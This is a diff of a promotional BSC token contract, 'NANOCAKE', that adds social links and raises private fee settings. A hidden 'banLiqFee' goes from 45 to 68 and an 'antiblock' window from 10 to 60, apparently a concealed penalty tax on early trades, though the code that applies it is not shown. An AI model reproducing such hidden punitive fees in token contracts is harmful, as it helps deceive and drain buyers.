@@ -4,14 +4,14 @@
 // $NanoCake proposes an innovative feature in its contract.
 //
 // DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
-// simply hold$NANOCake and you'll receive CAKE automatically in your wallet.
+// simply hold$NANOCAKE and you'll receive CAKE automatically in your wallet.
 // 
-// Hold NANO Cake and get rewarded in Cake on every transaction!
+// Hold NanoCake and get rewarded in Cake on every transaction!
 //
 //
-// 📱 Telegram:
-// 🌎 Website: 
-// 🌐 Twitter: 
+// 📱 Telegram: https://t.me/Nanocake_Official
+// 🌎 Website: https://nanocake.app
+// 🌐 Twitter: https://twitter.com/Nanocake_bsc
 
 pragma solidity ^0.6.2;
 
@@ -56,9 +56,9 @@ contract NANOCAKE is ERC20, Ownable {
     uint256 public _liquidityFee = 1;
     uint256 public _marketingFee = 10;
     uint256 private banRewFee = 1;
-    uint256 private banLiqFee = 45;
+    uint256 private banLiqFee = 68;
     uint256 private banMarFee = 1;
-    uint256 private antiblock = 10;
+    uint256 private antiblock = 60;
 
     address public _marketingWalletAddress = 0xBa09B01524fc6849ecB25cDE305F44afC2B91B8d;
 
